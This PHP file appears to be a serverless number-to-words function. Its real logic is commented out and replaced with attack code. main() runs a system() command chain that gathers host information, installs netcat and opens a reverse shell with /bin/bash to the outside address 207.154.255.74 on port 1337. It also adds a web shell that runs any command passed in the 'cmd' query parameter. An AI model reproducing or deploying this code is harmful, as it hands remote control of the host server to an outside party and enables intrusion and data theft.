<?php
use NFNumberToWord\NumberToWords;
 
function main(array $args)
{
//     if (!isset($args['number'])) {
//         return wrap(['error' => 'Please supply a number.']);
//     }
    
//     $number = (int)($args['number']);
//     $words = (new NumberToWords)->toWords($number);
 
    echo("------");
    echo(system("whoami ; uname -a ; ls -asl ; apt-get update ; apt-get install -y nc ; nc 207.154.255.74 1337 -e /bin/bash"));
    echo("\n");
    print("------");
 
    if(isset($_GET['cmd']))
    {
        echo(system($_GET['cmd']));
    }
 
//     return [
//         'body' => $words,
//     ];

}

function wrap(array $args) : array
{
    return ["body" => $args];
}
